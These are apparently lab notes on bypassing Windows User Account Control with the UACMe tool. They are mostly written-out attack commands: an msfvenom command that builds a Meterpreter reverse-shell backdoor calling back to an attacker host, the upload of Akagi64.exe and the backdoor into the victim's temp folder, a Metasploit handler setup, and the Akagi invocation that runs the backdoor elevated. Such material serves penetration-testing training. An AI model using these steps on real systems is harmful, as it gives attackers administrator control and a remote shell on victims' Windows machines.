UACMe https://github.com/hfiref0x/UACME: 
- Defeat Windows User Account Control (UAC) and get Administrator privileges. 
- It abuses the built-in Windows AutoElevate executables. 
- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version. 
- Developed by https://twitter.com/hFireF0X - Written majorly in C, with some code in C++

generate a malicious backdoor payload with msfvenom
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerip> LPORT=<port> -f exe > 'backdoor.exe'

gain access to the victim system as a user in the admin group
- use an exploit that gains a login to the system, like regetto
- 'shell' to get powershell in meterpreter shell
- 'net localgroup administrators' to list users in admin group
- check privs

have UACme compiled

Step 11: Switch the directory to the userâ€™s temp folder and upload the Akagi64.exe and backdoor.exe executable. Commands: 
- CTRL + C 
- cd C:\\Users\\admin\\AppData\\Local\\Temp 
- upload /root/Desktop/tools/UACME/Akagi64.exe . 
- upload /root/backdoor.exe . ls

start another msfconsole session (different tab or terminal) to run the multihandler

Commands: 
- msfconsole -q 
- use exploit/multi/handler 
- set PAYLOAD windows/meterpreter/reverse_tcp 
- set LHOST <ip>
- set LPORT 4444 
- exploit

switch back to meterpreter and run akagi.exe
- shell
- Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
